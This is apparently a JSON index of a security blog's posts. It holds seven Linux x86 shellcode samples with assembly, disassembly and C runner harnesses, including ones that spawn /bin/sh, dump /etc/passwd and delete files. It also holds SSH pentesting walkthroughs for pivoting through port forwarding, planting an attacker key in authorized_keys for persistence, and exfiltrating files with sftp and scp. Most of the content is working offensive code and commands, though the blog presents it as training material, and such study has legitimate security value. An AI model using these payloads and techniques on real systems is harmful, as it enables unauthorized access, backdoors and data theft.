[ { "title": "Linux/86 Delete file -&gt; Jmp-call-pop,XOR", "url": "/posts/l86unlinkjmpcallpopxor/", "categories": "Shellcodes, Linux", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "InfoDescription: Shellcode to delete a file.Platform: LinuxArch: x86Size: 30 bytesTechnique: jmp-call-pop, XORShellcode : \\xeb\\x0d\\x5b\\x31\\xc0\\xb0\\x0a\\xcd\\x80\\x31\\xdb\\xb0\\x01\\xcd\\x80\\xe8\\xee\\xff\\xff\\xff\\x68\\x61\\x63\\x6b\\x65\\x64\\x2e\\x74\\x78\\x74ExecutionAssembly-nasmnasm -f elf32 -o shellcode.o shellcode.asmld -o shellcode shellcode.oglobal _startsection .text_start: jmp datamain_: pop ebx ;delete file xor eax, eax mov al, 0xa int 0x80 ; exit xor ebx, ebx mov al, 0x1 int 0x80data: call main_ filename: db &quot;hacked.txt&quot; objdumpobjdump -d ./shellcode -M intel./shellcode: file format elf32-i386Disassembly of section .text:08048060 &amp;lt;_start&amp;gt;: 8048060: eb 0d jmp 804806f &amp;lt;data&amp;gt;08048062 &amp;lt;main_&amp;gt;: 8048062: 5b pop ebx 8048063: 31 c0 xor eax,eax 8048065: b0 0a mov al,0xa 8048067: cd 80 int 0x80 8048069: 31 db xor ebx,ebx 804806b: b0 01 mov al,0x1 804806d: cd 80 int 0x800804806f &amp;lt;data&amp;gt;: 804806f: e8 ee ff ff ff call 8048062 &amp;lt;main_&amp;gt;08048074 &amp;lt;filename&amp;gt;: 8048074: 68 61 63 6b 65 push 0x656b6361 8048079: 64 2e 74 78 fs cs je 80480f5 &amp;lt;filename+0x81&amp;gt; 804807d: 74 .byte 0x74Cgcc -o shellcode shellcode.c#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;const char * shellcode = &quot;\\xeb\\x0d\\x5b\\x31\\xc0\\xb0\\x0a\\xcd\\x80\\x31\\xdb\\xb0\\x01\\xcd\\x80\\xe8\\xee\\xff\\xff\\xff\\x68\\x61\\x63\\x6b\\x65\\x64\\x2e\\x74\\x78\\x74&quot;;int main(void){ printf(&quot;Length: %d\\n&quot;, strlen(shellcode)); (*(void(*)())shellcode)(); return 0;}" }, { "title": "Linux/86 Create Directory (mkdir)-&gt; Jmp-call-pop,XOR", "url": "/posts/l86mkdirjmpcallpopxor/", "categories": "Shellcodes, Linux", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "InfoDescription: Shellcode to create a directory.Platform: LinuxArch: x86Size: 29 bytesTechnique: jmp-call-pop, XORShellcode : \\xeb\\x13\\x5b\\x31\\xc0\\x31\\xc9\\xb0\\x27\\x66\\xb9\\xc0\\x01\\xcd\\x80\\x31\\xdb\\xb0\\x01\\xcd\\x80\\xe8\\xe8\\xff\\xff\\xff\\x70\\x77\\x6eExecutionAssembly-nasmnasm -f elf32 -o shellcode.o shellcode.asmld -o shellcode shellcode.oglobal _startsection .text_start: jmp datamain_: pop ebx ; create directory xor eax, eax xor ecx, ecx mov al, 0x27 mov cx, 0q700 int 0x80 ; exit xor ebx, ebx mov al, 0x1 int 0x80data: call main_ dirname: db &quot;pwn&quot; objdumpobjdump -d ./shellcode -M intel./shellcode: file format elf32-i386Disassembly of section .text:08048060 &amp;lt;_start&amp;gt;: 8048060: eb 13 jmp 8048075 &amp;lt;data&amp;gt;08048062 &amp;lt;main_&amp;gt;: 8048062: 5b pop ebx 8048063: 31 c0 xor eax,eax 8048065: 31 c9 xor ecx,ecx 8048067: b0 27 mov al,0x27 8048069: 66 b9 c0 01 mov cx,0x1c0 804806d: cd 80 int 0x80 804806f: 31 db xor ebx,ebx 8048071: b0 01 mov al,0x1 8048073: cd 80 int 0x8008048075 &amp;lt;data&amp;gt;: 8048075: e8 e8 ff ff ff call 8048062 &amp;lt;main_&amp;gt;0804807a &amp;lt;dirname&amp;gt;: 804807a: 70 77 jo 80480f3 &amp;lt;dirname+0x79&amp;gt; 804807c: 6e outs dx,BYTE PTR ds:[esi]Cgcc -o shellcode shellcode.c#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;const char * shellcode = &quot;\\xeb\\x13\\x5b\\x31\\xc0\\x31\\xc9\\xb0\\x27\\x66\\xb9\\xc0\\x01\\xcd\\x80\\x31\\xdb\\xb0\\x01\\xcd\\x80\\xe8\\xe8\\xff\\xff\\xff\\x70\\x77\\x6e&quot;;int main(void){ printf(&quot;Length: %d\\n&quot;, strlen(shellcode)); (*(void(*)())shellcode)(); return 0;}" }, { "title": "Linux/86 Helloword -&gt; Jmp-call-pop,XOR", "url": "/posts/l86hellosstackxor/", "categories": "Shellcodes, Linux", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "InfoDescription: Shellcode to print Hello WorldPlatform: LinuxArch: x86Size: 38 bytesTechnique: Jmp-call-pop, XORShellcode : \\xeb\\x13\\x59\\x31\\xc0\\x31\\xdb\\x31\\xd2\\xb0\\x04\\xb3\\x01\\xb2\\x0c\\xcd\\x80\\xb0\\x01\\xcd\\x80\\xe8\\xe8\\xff\\xff\\xff\\x48\\x65\\x6c\\x6c\\x6f\\x20\\x57\\x6f\\x72\\x6c\\x64\\x0aExecutionAssembly-nasmnasm -f elf32 -o shellcode.o shellcode.asmld -o shellcode shellcode.oglobal _startsection .text_start: jmp call_shellshell: pop ecx xor eax, eax xor ebx, ebx xor edx, edx mov al, 0x4 mov bl, 0x1 mov dl, 0xc int 0x80 mov al, 0x1 int 0x80call_shell: call shell msg: db &quot;Hello World&quot;, 0xAobjdumpobjdump -d ./shellcode -M intel./shellcode: file format elf32-i386Disassembly of section .text:08048060 &amp;lt;_start&amp;gt;: 8048060: eb 13 jmp 8048075 &amp;lt;call_shell&amp;gt;08048062 &amp;lt;shell&amp;gt;: 8048062: 59 pop ecx 8048063: 31 c0 xor eax,eax 8048065: 31 db xor ebx,ebx 8048067: 31 d2 xor edx,edx 8048069: b0 04 mov al,0x4 804806b: b3 01 mov bl,0x1 804806d: b2 0c mov dl,0xc 804806f: cd 80 int 0x80 8048071: b0 01 mov al,0x1 8048073: cd 80 int 0x8008048075 &amp;lt;call_shell&amp;gt;: 8048075: e8 e8 ff ff ff call 8048062 &amp;lt;shell&amp;gt;0804807a &amp;lt;msg&amp;gt;: 804807a: 48 dec eax 804807b: 65 6c gs ins BYTE PTR es:[edi],dx 804807d: 6c ins BYTE PTR es:[edi],dx 804807e: 6f outs dx,DWORD PTR ds:[esi] 804807f: 20 57 6f and BYTE PTR [edi+0x6f],dl 8048082: 72 6c jb 80480f0 &amp;lt;msg+0x76&amp;gt; 8048084: 64 fs 8048085: 0a .byte 0xaCgcc -o shellcode shellcode.c#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;char *shellcode = &quot;\\xeb\\x13\\x59\\x31\\xc0\\x31\\xdb\\x31\\xd2\\xb0\\x04\\xb3\\x01\\xb2\\x0c\\xcd\\x80\\xb0\\x01\\xcd\\x80\\xe8\\xe8\\xff\\xff\\xff\\x48\\x65\\x6c\\x6c\\x6f\\x20\\x57\\x6f\\x72\\x6c\\x64\\x0a&quot;;int main(void){ fprintf(stdout,&quot;Length: %d\\n&quot;,strlen(shellcode)); (*(void(*)()) shellcode)(); return 0;}" }, { "title": "Linux/86 Helloword -&gt; Stack,XOR", "url": "/posts/l86hellojmpcallpopxor/", "categories": "Shellcodes, Linux", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "InfoDescription: Shellcode to print Hello WorldPlatform: LinuxArch: x86Size: 36 bytesTechnique: Stack, XORShellcode : \\x68\\x72\\x6c\\x64\\x0a\\x68\\x6f\\x20\\x57\\x6f\\x68\\x48\\x65\\x6c\\x6c\\x31\\xc0\\x31\\xdb\\x31\\xd2\\xb0\\x04\\xb3\\x01\\x8d\\x0c\\x24\\xb2\\x0c\\xcd\\x80\\xb0\\x01\\xcd\\x80ExecutionAssembly-nasmnasm -f elf32 -o shellcode.o shellcode.asmld -o shellcode shellcode.oglobal _startsection .text_start: ; Hello World push 0x0a646c72 push 0x6f57206f push 0x6c6c6548 xor eax, eax xor ebx, ebx xor edx, edx mov al, 0x4 mov bl, 0x1 lea ecx, [esp] mov dl, 0xc int 0x80 mov al, 0x1 int 0x80objdumpobjdump -d ./shellcode -M intel./shellcode: file format elf32-i386Disassembly of section .text:08048060 &amp;lt;_start&amp;gt;: 8048060: 68 72 6c 64 0a push 0xa646c72 8048065: 68 6f 20 57 6f push 0x6f57206f 804806a: 68 48 65 6c 6c push 0x6c6c6548 804806f: 31 c0 xor eax,eax 8048071: 31 db xor ebx,ebx 8048073: 31 d2 xor edx,edx 8048075: b0 04 mov al,0x4 8048077: b3 01 mov bl,0x1 8048079: 8d 0c 24 lea ecx,[esp] 804807c: b2 0c mov dl,0xc 804807e: cd 80 int 0x80 8048080: b0 01 mov al,0x1 8048082: cd 80 int 0x80Cgcc -o shellcode shellcode.c#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;char *shellcode = &quot;\\x68\\x72\\x6c\\x64\\x0a\\x68\\x6f\\x20\\x57\\x6f\\x68\\x48\\x65\\x6c\\x6c\\x31\\xc0\\x31\\xdb\\x31\\xd2\\xb0\\x04\\xb3\\x01\\x8d\\x0c\\x24\\xb2\\x0c\\xcd\\x80\\xb0\\x01\\xcd\\x80&quot;;int main(void){ fprintf(stdout,&quot;Length: %d\\n&quot;,strlen(shellcode)); (*(void(*)()) shellcode)(); return 0;}" }, { "title": "Linux/86 execve -&gt; Stack,XOR", "url": "/posts/l86execvestackxor/", "categories": "Shellcodes, Linux", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "InfoDescription: Shellcode to spawn /bin/shPlatform: LinuxArch: x86Size: 28 bytesTechnique: Stack, XORShellcode : \\x31\\xc0\\x50\\x8d\\x14\\x24\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x8d\\x1c\\x24\\x50\\x53\\x8d\\x0c\\x24\\xb0\\x0b\\xcd\\x80ExecutionAssembly-nasmnasm -f elf32 -o shellcode.o shellcode.asmld -o shellcode shellcode.oglobal _startsection .text_start: xor eax, eax push eax lea edx, [esp] ;//bin/sh push 0x68732f6e push 0x69622f2f lea ebx, [esp] push eax push ebx lea ecx, [esp] mov al,0xb int 0x80objdumpobjdump -d ./shellcode -M intel./shellcode: file format elf32-i386Disassembly of section .text:08048060 &amp;lt;_start&amp;gt;: 8048060: 31 c0 xor eax,eax 8048062: 50 push eax 8048063: 8d 14 24 lea edx,[esp] 8048066: 68 6e 2f 73 68 push 0x68732f6e 804806b: 68 2f 2f 62 69 push 0x69622f2f 8048070: 8d 1c 24 lea ebx,[esp] 8048073: 50 push eax 8048074: 53 push ebx 8048075: 8d 0c 24 lea ecx,[esp] 8048078: b0 0b mov al,0xb 804807a: cd 80 int 0x80Cgcc -o shellcode shellcode.c#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;char *shellcode = &quot;\\x31\\xc0\\x50\\x8d\\x14\\x24\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x8d\\x1c\\x24\\x50\\x53\\x8d\\x0c\\x24\\xb0\\x0b\\xcd\\x80&quot;;int main(void){ fprintf(stdout,&quot;Length: %d\\n&quot;,strlen(shellcode)); (*(void(*)()) shellcode)(); return 0;}" }, { "title": "Linux/86 Create file -&gt; Jmp-call-pop,Stack,XOR", "url": "/posts/l86createfilestackxorjmpcallpop/", "categories": "Shellcodes, Linux", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "InfoDescription: Shellcode to create a file and write data into it.Platform: LinuxArch: x86Size: 65 bytesTechnique: jmp-call-pop,Stack, XORShellcode : \\xeb\\x30\\x5b\\x31\\xc0\\x31\\xc9\\xb0\\x08\\x66\\xb9\\xff\\x01\\xcd\\x80\\x89\\xc3\\x31\\xd2\\x68\\x65\\x64\\x21\\x0a\\x68\\x48\\x61\\x63\\x6b\\x8d\\x0c\\x24\\xb0\\x04\\xb2\\x08\\xcd\\x80\\x31\\xc0\\xb0\\x06\\xcd\\x80\\x31\\xdb\\xb0\\x01\\xcd\\x80\\xe8\\xcb\\xff\\xff\\xff\\x68\\x61\\x63\\x6b\\x65\\x64\\x2e\\x74\\x78\\x74ExecutionAssembly-nasmnasm -f elf32 -o shellcode.o shellcode.asmld -o shellcode shellcode.oglobal _start section .text _start: jmp data main_: pop ebx ; create file xor eax, eax xor ecx, ecx mov al, 0x8 mov cx, 0q777 int 0x80 ;write data mov ebx, eax xor edx, edx push 0xA216465 push 0x6b636148 lea ecx, [esp] mov al, 0x4 mov dl, 0x8 int 0x80 ; close file xor eax, eax mov al, 0x6 int 0x80 ; exit xor ebx, ebx mov al, 0x1 int 0x80 data: call main_ filename: db &quot;hacked.txt&quot; objdumpobjdump -d ./shellcode -M intel./shellcode: file format elf32-i386Disassembly of section .text:08048060 &amp;lt;_start&amp;gt;: 8048060: eb 30 jmp 8048092 &amp;lt;data&amp;gt;08048062 &amp;lt;main_&amp;gt;: 8048062: 5b pop ebx 8048063: 31 c0 xor eax,eax 8048065: 31 c9 xor ecx,ecx 8048067: b0 08 mov al,0x8 8048069: 66 b9 ff 01 mov cx,0x1ff 804806d: cd 80 int 0x80 804806f: 89 c3 mov ebx,eax 8048071: 31 d2 xor edx,edx 8048073: 68 65 64 21 0a push 0xa216465 8048078: 68 48 61 63 6b push 0x6b636148 804807d: 8d 0c 24 lea ecx,[esp] 8048080: b0 04 mov al,0x4 8048082: b2 08 mov dl,0x8 8048084: cd 80 int 0x80 8048086: 31 c0 xor eax,eax 8048088: b0 06 mov al,0x6 804808a: cd 80 int 0x80 804808c: 31 db xor ebx,ebx 804808e: b0 01 mov al,0x1 8048090: cd 80 int 0x8008048092 &amp;lt;data&amp;gt;: 8048092: e8 cb ff ff ff call 8048062 &amp;lt;main_&amp;gt;08048097 &amp;lt;filename&amp;gt;: 8048097: 68 61 63 6b 65 push 0x656b6361 804809c: 64 2e 74 78 fs cs je 8048118 &amp;lt;filename+0x81&amp;gt; 80480a0: 74 .byte 0x74Cgcc -o shellcode shellcode.c#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;const char * shellcode = &quot;\\xeb\\x30\\x5b\\x31\\xc0\\x31\\xc9\\xb0\\x08\\x66\\xb9\\xff\\x01\\xcd\\x80\\x89\\xc3\\x31\\xd2\\x68\\x65\\x64\\x21\\x0a\\x68\\x48\\x61\\x63\\x6b\\x8d\\x0c\\x24\\xb0\\x04\\xb2\\x08\\xcd\\x80\\x31\\xc0\\xb0\\x06\\xcd\\x80\\x31\\xdb\\xb0\\x01\\xcd\\x80\\xe8\\xcb\\xff\\xff\\xff\\x68\\x61\\x63\\x6b\\x65\\x64\\x2e\\x74\\x78\\x74&quot;;int main(void){ printf(&quot;Length: %d\\n&quot;, strlen(shellcode)); (*(void(*)())shellcode)(); return 0;}" }, { "title": "Linux/86 cat /etc/passwd -&gt; Stack,XOR", "url": "/posts/l86catetcpasswdestackxor/", "categories": "Shellcodes, Linux", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "InfoDescription: Shellcode to retrive /etc/passwd file using /bin/catPlatform: LinuxArch: x86Size: 48 bytesTechnique: Stack, XORShellcode : \\x31\\xc0\\x50\\x8d\\x14\\x24\\x68\\x2f\\x63\\x61\\x74\\x68\\x2f\\x62\\x69\\x6e\\x8d\\x1c\\x24\\x50\\x68\\x73\\x73\\x77\\x64\\x68\\x63\\x2f\\x70\\x61\\x68\\x2f\\x2f\\x65\\x74\\x8d\\x34\\x24\\x50\\x56\\x53\\x8d\\x0c\\x24\\xb0\\x0b\\xcd\\x80ExecutionAssembly-nasmnasm -f elf32 -o shellcode.o shellcode.asmld -o shellcode shellcode.oglobal _startsection .text_start: xor eax, eax push eax lea edx, [esp] ;/bin/cat push 0x7461632f push 0x6e69622f lea ebx, [esp] ;//etc/passwd0x00000000 push eax push 0x64777373 push 0x61702f63 push 0x74652f2f lea esi, [esp] push eax push esi push ebx lea ecx, [esp] mov al, 0xb int 0x80objdumpobjdump -d ./shellcode -M intel./shellcode: file format elf32-i386Disassembly of section .text:08048060 &amp;lt;_start&amp;gt;: 8048060: 31 c0 xor eax,eax 8048062: 50 push eax 8048063: 8d 14 24 lea edx,[esp] 8048066: 68 2f 63 61 74 push 0x7461632f 804806b: 68 2f 62 69 6e push 0x6e69622f 8048070: 8d 1c 24 lea ebx,[esp] 8048073: 50 push eax 8048074: 68 73 73 77 64 push 0x64777373 8048079: 68 63 2f 70 61 push 0x61702f63 804807e: 68 2f 2f 65 74 push 0x74652f2f 8048083: 8d 34 24 lea esi,[esp] 8048086: 50 push eax 8048087: 56 push esi 8048088: 53 push ebx 8048089: 8d 0c 24 lea ecx,[esp] 804808c: b0 0b mov al,0xb 804808e: cd 80 int 0x80Cgcc -o shellcode shellcode.c#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; char *shellcode = &quot;\\x31\\xc0\\x50\\x8d\\x14\\x24\\x68\\x2f\\x63\\x61\\x74\\x68\\x2f\\x62\\x69\\x6e\\x8d\\x1c\\x24\\x50\\x68\\x73\\x73\\x77\\x64\\x68\\x63\\x2f\\x70\\x61\\x68\\x2f\\x2f\\x65\\x74\\x8d\\x34\\x24\\x50\\x56\\x53\\x8d\\x0c\\x24\\xb0\\x0b\\xcd\\x80&quot;;int main(void){ fprintf(stdout,&quot;Length: %d\\n&quot;,strlen(shellcode)); (*(void(*)()) shellcode)(); return 0;}" }, { "title": "SSH Pentesting -&gt; Pivoting", "url": "/posts/ssh-pivot/", "categories": "Infrastructure Pentesting, SSH", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Pivoting: mitre -&amp;gt; TA0008, T1572Pivoting Is a technique of routing network traffics from one system to another system or networks. Is a technigue that adversary uses to move from one compromised system to another system or to access devices, networks and ports that are not publicly accessible.Accessing internal port via ssh tunnelingAccessing internal machine via ssh tunnelingTechnigues SSH Local Port Forwarding Remote Port Forwarding Dynamic Port ForwardingSSH Local Port ForwardingIs a technigue that allows you to forward a port on the local (ssh client) machine to a port on the remote (ssh server) machine, which is then forwarded to a port on the destination machine.syntax ssh -L [local_ip]:[local_port]:[destination_ip]:[destination_port] -N -f [username]@[remote_ip]Accessing rdp port 3389 using ssh local portforwarding┌──(cyberkhalid㉿kali)-[~]└─$ ssh -L 127.0.0.1:8000:172.172.0.20:3389 -N -f user1@10.42.0.21user1@10.42.0.21&#39;s password: ┌──(cyberkhalid㉿kali)-[~]└─$ rdesktop 127.0.0.1:8000Autoselecting keyboard map &#39;en-us&#39; from localeCore(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.Failed to initialize NLA, do you have correct Kerberos TGT initialized ?Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.Connection established using SSL.SSH Remote Port ForwardingIs a technigue that allows you to forward a port on the remote (ssh server) machine to a port on the local (ssh client) machine, which is then forwarded to a port on the destination machine.syntax ssh -R [remote_port]:[destination_ip]:[destination_port] -N -f [username]@[remote_ip]Accessing http port 50000 using ssh remote portforwarding┌──(cyberkhalid㉿kali)-[~]└─$ ssh -R 8000:127.0.0.1:50000 -N -f user1@10.42.0.21user1@10.42.0.21&#39;s password: ┌──(cyberkhalid㉿kali)-[~]└─$ From the ssh server machineDynamic Port ForwardingIs a technigue that allows you to create a socket on the local (ssh client) machine, which acts as a SOCKS proxy server. When a client connects to this port, the connection is forwarded to the remote (ssh server) machine, which is then forwarded to a dynamic port on the destination machine.It Creates a SOCKS proxy server that allows communication across a range of ports.syntax ssh -D [local_port] -N -f [username]@[target_ip]Note: Make sure to modify the proxychains config file.Accessing rdp port 3389 using ssh dynamic portforwarding┌──(cyberkhalid㉿kali)-[~]└─$ ssh -D 1000 -N -f user1@10.42.0.21 user1@10.42.0.21&#39;s password: ┌──(cyberkhalid㉿kali)-[~]└─$ proxychains rdesktop 172.172.0.20[proxychains] config file found: /etc/proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.16Autoselecting keyboard map &#39;en-us&#39; from locale[proxychains] Strict chain ... 127.0.0.1:1000 ... 172.172.0.20:3389 ... OKReferences https://www.ssh.com/academy/ssh/tunneling/example https://en.wikipedia.org/wiki/Port_forwarding https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding https://linuxize.com/post/how-to-setup-ssh-tunneling/" }, { "title": "SSH Pentesting -&gt; Persistence", "url": "/posts/ssh-persist/", "categories": "Infrastructure Pentesting, SSH", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "persistence: mitre -&amp;gt; TA0003Persistence Is a technigue that allows adversary to maintain access to a compromised system for a period of time.technigues SSH Authorized Keys : mitre -&amp;gt; T1098.004ssh keysSSH Authorized Keys specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user’s home directory under /.ssh/authorized_keys. Adversaries may modify SSH authorized_keys files directly with scripts or shell commands to add their own adversary-supplied public keys, which will provide them with a persistent access to the compromised system.Steps Gain access to the target system. Generate your ssh-key pair(public and private keys using ssh-keygen). Insert your generated ssh public key(.pub) in the authorized_keys file of the target system(~/.ssh/authorized_keys). Login to the system with your generated ssh private keyGain access to the target system.shell on target systemuser1@user1-VirtualBox:~$ whoamiuser1user1@user1-VirtualBox:~$ pwd/home/user1user1@user1-VirtualBox:~$ cd .sshuser1@user1-VirtualBox:~/.ssh$ lsauthorized_keys known_hostsuser1@user1-VirtualBox:~/.ssh$ Generate your ssh-key pair(public and private keys using ssh-keygen)Generating ssh keys with ssh-keygen┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ ssh-keygenGenerating public/private rsa key pair.Enter file in which to save the key (/home/cyberkhalid/.ssh/id_rsa): /home/cyberkhalid/pentest/data/persistEnter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/cyberkhalid/pentest/data/persistYour public key has been saved in /home/cyberkhalid/pentest/data/persist.pubThe key fingerprint is:SHA256:Co9FQudtbnGl9sPCILHbe7LMp+ygwP6FTIE1weM+qxs cyberkhalid@kaliThe key&#39;s randomart image is:+---[RSA 3072]----+| .=.o . || +o+ + o || ..o.= = + || .+ * * o || .o o S o + || . oo* o . . . || E +o= o . || . o.o = +. || ++o .Bo |+----[SHA256]-----+┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ lspersist persist.pubInsert your generated ssh public key(.pub) in the authorized_keys fileCopying pubic key(.pub) file┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ lspersist persist.pub┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ cat persist.pubssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXHulTi79pBVYleeDwhLo3HQNsiTMCUKUAdBU9pa/P73Qr87MEMAWONq96RCEbyZHl8vHsgxQbsx0pIu1G8gCUFetg/Nce5UrAwcNst6mDjJpgLYz2TToEDS0cVTS+8loD604A4vv6WQnxOGRpBHwyxnoKzSB2eQ3dKm4QmCBnpzIHp9iOe3rN7/TZ8oU/VJWB/EqPUpjJdRFBYY7rgswoP5v6ilMqui2O1bRBSsV5qkk5aW9rPBExeLqDX7TMxRn6AQogk8sMYIOITlPQEsmSMs7vmfX1nR11eAVAFUfA/bll+LHQ5QOWbq4TxrtXNYEIs8LPMXTBFo+ZDVyztD9hkgMfSVHYAzcTqafeDxV5m6JQFPzCICykLPOlTUFIlHjX0TJlg85anrh1u14bmCO+h3GZI4cwQL9CexKr3fGtzj4qyOfzbZ5srYmMNlVNVUlNW4bBod0zFLJ7t2+Tk6tjDLU3XZlIANkFPWs/g3/HUycFlqFLmNatlVEkH5rCJCE= cyberkhalid@kaliInserting public key in authorized_keys fileuser1@user1-VirtualBox:~/.ssh$ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXHulTi79pBVYleeDwhLo3HQNsiTMCUKUAdBU9pa/P73Qr87MEMAWONq96RCEbyZHl8vHsgxQbsx0pIu1G8gCUFetg/Nce5UrAwcNst6mDjJpgLYz2TToEDS0cVTS+8loD604A4vv6WQnxOGRpBHwyxnoKzSB2eQ3dKm4QmCBnpzIHp9iOe3rN7/TZ8oU/VJWB/EqPUpjJdRFBYY7rgswoP5v6ilMqui2O1bRBSsV5qkk5aW9rPBExeLqDX7TMxRn6AQogk8sMYIOITlPQEsmSMs7vmfX1nR11eAVAFUfA/bll+LHQ5QOWbq4TxrtXNYEIs8LPMXTBFo+ZDVyztD9hkgMfSVHYAzcTqafeDxV5m6JQFPzCICykLPOlTUFIlHjX0TJlg85anrh1u14bmCO+h3GZI4cwQL9CexKr3fGtzj4qyOfzbZ5srYmMNlVNVUlNW4bBod0zFLJ7t2+Tk6tjDLU3XZlIANkFPWs/g3/HUycFlqFLmNatlVEkH5rCJCE= cyberkhalid@kali&quot; &amp;gt;&amp;gt; authorized_keysuser1@user1-VirtualBox:~/.ssh$ Login to the systemNote: Make sure you change the permission of the private key to 400.(chmod 400 privatekeyfile).login using the generated private key┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ lspersist persist.pub┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ chmod 400 persist┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ ssh -i persist user1@10.42.0.21Enter passphrase for key &#39;persist&#39;: Last login: Tue Jun 7 00:30:09 2022 from 10.42.0.1user1@user1-VirtualBox:~$ whoamiuser1user1@user1-VirtualBox:~$ Mitigations Disable SSH if it is not necessary on a host or restrict SSH access for specific users/groups using /etc/ssh/sshd_config. Restrict access to the authorized_keys file.References https://attack.mitre.org/techniques/T1098/004/ https://attack.mitre.org/techniques/T1098/004/ https://attack.mitre.org/tactics/TA0003/ https://www.ssh.com/academy/ssh/authorized-keys-file https://attack.mitre.org/techniques/T1098/004/" }, { "title": "SSH Pentesting", "url": "/posts/ssh-pentesting/", "categories": "Infrastructure Pentesting, SSH", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "SSHSSH stands for Secure Shell or Secure Socket Shell, is a protocol for secure remote login from one computer to another.It provides users with a secure way to access and manage a computer over an unsecured network.TechniguesThese are techniques that can be used to leverage ssh protocol during pentesting. Enumeration Bruteforce Pivoting Persistence ExfiltrationEnumerationEnumeration: Is a technigue of discovering potential attack vectors in a target system.BruteforceBruteforce: A brute force attack is a technigue that uses trial-and-error to guess login credentials.PivotingPivoting: Is a technique of routing network traffic from a compromised system to another system or networks. Is a technigue that adversary uses to move from one compromised system to another system or to access resources(networks, ports, etc..) that are not accessible.PersistencePersistence: Is a technigue that allows adversary to maintain access to a compromised system for a period of time.ExfiltrationExfiltration: Is a technigue of removing/transfering data from a compromsied system.References https://attack.mitre.org/techniques/T1110/ https://www.kaspersky.com/resource-center/definitions/brute-force-attack https://attack.mitre.org/tactics/TA0028/ https://attack.mitre.org/tactics/TA0036/" }, { "title": "SSH Pentesting -&gt; Exfiltration", "url": "/posts/ssh-exfiltration/", "categories": "Infrastructure Pentesting, SSH", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Exfiltration : mitre -&amp;gt; TA0010Exfiltration Is a technigue of removing/transfering data from a compromsied system. Adversaries may use this technigue to steal data from a target network.ToolsThese are some of the tools that are used to exfiltrate data via ssh protocol. sftp scpsftpSFTP Known as SSH File Transfer Protocol or Secure File Transfer Protocol is a network protocol that provides file access, file transfer, and file management over any reliable data stream.Exfiltrating data from the compromised systemsyntax sftp [username]@[target_ip]downloading dev.git file from the target system┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ sftp user1@192.168.43.234user1@192.168.43.234&#39;s password: Connected to 192.168.43.234.sftp&amp;gt; lsDesktop Documents Downloads Music Pictures Public Templates Videos addr.txt b.elf dev.git irc sftp&amp;gt; get dev.gitFetching /home/user1/dev.git to dev.gitsftp&amp;gt; exit┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ lsdev.gitTransfering data to the compromised systemsyntax sftp [username]@[target_ip]uploading tools.zip file to the target system┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ lstools.zip┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ sftp user1@192.168.43.234user1@192.168.43.234&#39;s password: Connected to 192.168.43.234.sftp&amp;gt; lsDesktop Documents Downloads Music Pictures Public Templates Videos addr.txt b.elf dev.git irc sftp&amp;gt; put tools.zipUploading tools.zip to /home/user1/tools.ziptools.zip 100% 0 0.0KB/s 00:00 sftp&amp;gt; lsDesktop Documents Downloads Music Pictures Public Templates Videos addr.txt b.elf dev.git irc tools.zip sftp&amp;gt; exitSCPSCP Secure copy protocol (SCP) is a means of securely transferring computer files between a local host and a remote host or between two remote hosts.Exfiltrating data from the compromised system to your systemsyntax scp [username]@[target_ip]:[path_to_remote_file] [path_to_destination]downloading dev.git file from the target system┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ ls┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ scp user1@192.168.43.234:/home/user1/dev.git /home/cyberkhalid/pentest/data/dev.gituser1@192.168.43.234&#39;s password: ┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ lsdev.gitExfiltrating data from one remote system to another remote systemsyntax scp [username]@[from_target_ip]:[path_to_file_to_be_copied] [username]@[to_target_ip]:[path_to_destination]transfering dev.git file from 10.42.0.21 to 10.42.0.1┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ scp user1@10.42.0.21:/home/user1/dev.git cyberkhalid@10.42.0.1:/home/cyberkhalid/pentest/datacyberkhalid@10.42.0.1&#39;s password: user1@10.42.0.21&#39;s password: 